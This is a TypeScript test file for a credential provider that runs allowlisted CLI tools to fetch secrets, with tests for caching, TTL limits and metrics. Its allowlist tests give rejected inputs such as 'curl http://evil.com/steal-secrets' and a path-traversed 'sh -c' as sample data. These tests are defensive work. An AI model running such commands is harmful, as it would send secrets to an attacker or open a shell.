/**
 * Tests for command-based credential provider.
 * Issue #1671, #2189.
 */
import { describe, it, expect, vi, afterEach } from 'vitest';
import {
  executeCredentialCommand,
  resolveCommandCredential,
  clearCredentialCache,
  getCredentialCacheMetrics,
  ALLOWED_BINARIES,
} from './command-provider.ts';

// Mock child_process.execFile (safe: no shell injection, uses execFile not exec)
vi.mock('node:child_process', () => ({
  execFile: vi.fn(),
}));

import { execFile } from 'node:child_process';

const mockedExecFile = vi.mocked(execFile);

afterEach(() => {
  vi.clearAllMocks();
  clearCredentialCache();
});

describe('credentials/command-provider', () => {
  describe('ALLOWED_BINARIES', () => {
    it('includes expected credential tool binaries', () => {
      expect(ALLOWED_BINARIES).toContain('op');
      expect(ALLOWED_BINARIES).toContain('aws');
      expect(ALLOWED_BINARIES).toContain('gcloud');
      expect(ALLOWED_BINARIES).toContain('vault');
    });
  });

  describe('executeCredentialCommand', () => {
    it('returns trimmed stdout on success', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          (cb as Function)(null, '  secret-value  \n', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      const result = await executeCredentialCommand('op read op://vault/key', 5000);
      expect(result).toBe('secret-value');
    });

    it('rejects on empty output', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          (cb as Function)(null, '  \n', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await expect(
        executeCredentialCommand('op read something', 5000),
      ).rejects.toThrow('empty output');
    });

    it('rejects on non-zero exit code', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          const error = new Error('Command failed') as NodeJS.ErrnoException;
          error.code = 'ERR_CHILD_PROCESS';
          (cb as Function)(error, '', 'some stderr');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await expect(
        executeCredentialCommand('op read something', 5000),
      ).rejects.toThrow('failed with exit code');
    });

    it('rejects on timeout', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          const error = new Error('Timed out') as NodeJS.ErrnoException;
          error.killed = true;
          (cb as Function)(error, '', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await expect(
        executeCredentialCommand('op read something', 1000),
      ).rejects.toThrow('timed out after 1000ms');
    });

    it('rejects on empty command', async () => {
      await expect(
        executeCredentialCommand('', 5000),
      ).rejects.toThrow('Empty credential command');
    });

    it('parses command with arguments correctly', async () => {
      let capturedCmd: string | undefined;
      let capturedArgs: string[] | undefined;

      mockedExecFile.mockImplementation(
        (cmd: unknown, args: unknown, _opts: unknown, cb: unknown) => {
          capturedCmd = cmd as string;
          capturedArgs = args as string[];
          (cb as Function)(null, 'result', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await executeCredentialCommand('op read op://vault/key', 5000);
      expect(capturedCmd).toBe('op');
      expect(capturedArgs).toEqual(['read', 'op://vault/key']);
    });

    // Issue #2189: Command allowlisting
    it('rejects disallowed binary', async () => {
      await expect(
        executeCredentialCommand('curl http://evil.com/steal-secrets', 5000),
      ).rejects.toThrow('not in the allowlist');
    });

    it('rejects commands with path traversal in binary', async () => {
      await expect(
        executeCredentialCommand('/usr/bin/curl http://evil.com', 5000),
      ).rejects.toThrow('not in the allowlist');
    });

    it('rejects commands with relative path', async () => {
      await expect(
        executeCredentialCommand('../../../bin/sh -c "id"', 5000),
      ).rejects.toThrow('not in the allowlist');
    });

    it('rejects commands with shell metacharacters in arguments', async () => {
      // Even though we use execFile (no shell), the binary must be allowlisted
      await expect(
        executeCredentialCommand('sh -c "op read op://vault/key"', 5000),
      ).rejects.toThrow('not in the allowlist');
    });

    it('allows all allowlisted binaries', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          (cb as Function)(null, 'value', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      for (const binary of ALLOWED_BINARIES) {
        const result = await executeCredentialCommand(`${binary} some-arg`, 5000);
        expect(result).toBe('value');
      }
    });
  });

  describe('resolveCommandCredential', () => {
    it('returns value from command execution', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          (cb as Function)(null, 'resolved-secret', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      const result = await resolveCommandCredential(
        'cred-1',
        'op read op://vault/key',
        5000,
        0, // no cache
      );
      expect(result).toBe('resolved-secret');
    });

    it('caches result when cacheTtlS > 0', async () => {
      let callCount = 0;
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          callCount++;
          (cb as Function)(null, `secret-${callCount}`, '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      const result1 = await resolveCommandCredential(
        'cred-cached',
        'op read op://vault/key',
        5000,
        60, // 60s cache
      );
      expect(result1).toBe('secret-1');

      const result2 = await resolveCommandCredential(
        'cred-cached',
        'op read op://vault/key',
        5000,
        60,
      );
      // Should return cached value, not call command again
      expect(result2).toBe('secret-1');
      expect(callCount).toBe(1);
    });

    it('does not cache when cacheTtlS is 0', async () => {
      let callCount = 0;
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          callCount++;
          (cb as Function)(null, `secret-${callCount}`, '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await resolveCommandCredential('cred-no-cache', 'op get item', 5000, 0);
      await resolveCommandCredential('cred-no-cache', 'op get item', 5000, 0);

      expect(callCount).toBe(2);
    });

    it('clearCredentialCache removes all cached values', async () => {
      let callCount = 0;
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          callCount++;
          (cb as Function)(null, `secret-${callCount}`, '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await resolveCommandCredential('cred-clear', 'op get item', 5000, 60);
      expect(callCount).toBe(1);

      clearCredentialCache();

      await resolveCommandCredential('cred-clear', 'op get item', 5000, 60);
      // Command should be called again after cache clear
      expect(callCount).toBe(2);
    });

    // Issue #2189: LRU cache with max size
    it('evicts oldest entries when cache exceeds max size', async () => {
      let callCount = 0;
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          callCount++;
          (cb as Function)(null, `secret-${callCount}`, '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      // Fill cache beyond max (100 entries)
      for (let i = 0; i < 101; i++) {
        await resolveCommandCredential(`cred-${i}`, 'op get item', 5000, 600);
      }

      // The first entry should have been evicted (LRU)
      const metrics = getCredentialCacheMetrics();
      expect(metrics.size).toBeLessThanOrEqual(100);
    });

    // Issue #2189: Max TTL enforcement
    it('enforces max TTL of 15 minutes even if higher TTL requested', async () => {
      let callCount = 0;
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          callCount++;
          (cb as Function)(null, `secret-${callCount}`, '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      // Request a 1-hour TTL — should be capped at 15 minutes
      await resolveCommandCredential('cred-max-ttl', 'op get item', 5000, 3600);

      const metrics = getCredentialCacheMetrics();
      expect(metrics.maxTtlSeconds).toBe(900); // 15 minutes
    });

    // Issue #2189: Cache metrics exposure
    it('exposes cache metrics', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          (cb as Function)(null, 'value', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await resolveCommandCredential('metrics-test', 'op get item', 5000, 60);

      const metrics = getCredentialCacheMetrics();
      expect(metrics).toHaveProperty('size');
      expect(metrics).toHaveProperty('hits');
      expect(metrics).toHaveProperty('misses');
      expect(metrics).toHaveProperty('maxSize');
      expect(metrics).toHaveProperty('maxTtlSeconds');
      expect(metrics.size).toBe(1);
      expect(metrics.misses).toBeGreaterThanOrEqual(1);
    });

    it('increments hit counter on cache hit', async () => {
      mockedExecFile.mockImplementation(
        (_cmd: unknown, _args: unknown, _opts: unknown, cb: unknown) => {
          (cb as Function)(null, 'value', '');
          return {} as ReturnType<typeof execFile>;
        },
      );

      await resolveCommandCredential('hit-test', 'op get item', 5000, 60);
      const before = getCredentialCacheMetrics();

      await resolveCommandCredential('hit-test', 'op get item', 5000, 60);
      const after = getCredentialCacheMetrics();

      expect(after.hits).toBe(before.hits + 1);
    });
  });
});
